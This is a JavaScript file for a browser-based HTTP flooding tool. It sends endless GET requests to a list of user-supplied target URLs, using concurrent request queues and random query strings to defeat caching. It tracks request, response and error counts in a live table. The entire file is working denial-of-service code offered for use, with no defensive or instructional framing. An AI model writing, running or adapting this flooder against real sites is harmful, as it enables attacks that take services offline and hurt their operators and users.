var textarea = document.getElementById('targets');
var time = document.getElementById('time').value;
var timeout = document.getElementById('timeout').value;
var threads = document.getElementById('threads').value;
var start = document.getElementById('start');
var stop = document.getElementById('stop');
var stats = document.getElementById('stats');
var firstTime = true;
var targetStats = {};
var isStarted = false;
var queue = [];
var tbody, targets, generateTable, stopFlood, rand;

function StartFlood() {
    targets = textarea.value.split('\n');
    targets.forEach((target) => {
        targetStats[target] = {requests: 0, responses: 0, errors: 0, errorMessage: ''}
    });

    if(firstTime) { 
        stats.innerHTML = '<br><br><table border="3"><thead><th>TARGETS</th><th>REQUESTS</th><th>RESPONSES</th><th>ERRORS</th><th>ERROR MESSAGE</th></thead><tbody></tbody></table>';
        tbody = document.querySelector('tbody');
        firstTime = false;
    }
    interval = setInterval(GenerateTable, 1000);
    stopFlood = setTimeout(StopFlood, time*1000);
    isStarted = true;
    targets.map(Flood);
}

function StopFlood() {
    clearInterval(generateTable);
    clearTimeout(stopFlood);
    isStarted = false;
}

function GenerateTable() {
    tbody.innerHTML = null;
    targets.forEach((target, index) => {
        tbody.innerHTML += '<tr><td>' + target + '</td><td>' + targetStats[target].requests + '</td><td>' + targetStats[target].responses + '</td><td>' + targetStats[target].errors + '</td><td>' + targetStats[target].errorMessage + '</td></tr>';
    });
}

async function FetchWithTimeout(url) {
    const controller = new AbortController();
    const fetchTimeOut = setTimeout(() => controller.abort(), timeout);
    return fetch(url, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
      }).then((response) => {
        clearTimeout(fetchTimeOut);
        return response;
      }).catch((error) => {
        clearTimeout(fetchTimeOut);
        throw error;
      });
}

async function Flood(target) {
    while(isStarted) {
        if(queue.length > threads) await queue.shift();
        rand = '?' + Math.floor(Math.random() * 1000);
        queue.push(FetchWithTimeout(target+rand)
        .catch((error) => { 
            if (error.code === 20) return;
            targetStats[target].errors++;
            targetStats[target].errorMessage = error.message;
        })
        .then((response) => {
            if (response && !response.ok) {
                targetStats[target].errors++;
                targetStats[target].errorMessage = response.statusText;
            }
            else targetStats[target].responses++;
        })
        );
        targetStats[target].requests++;
    }
}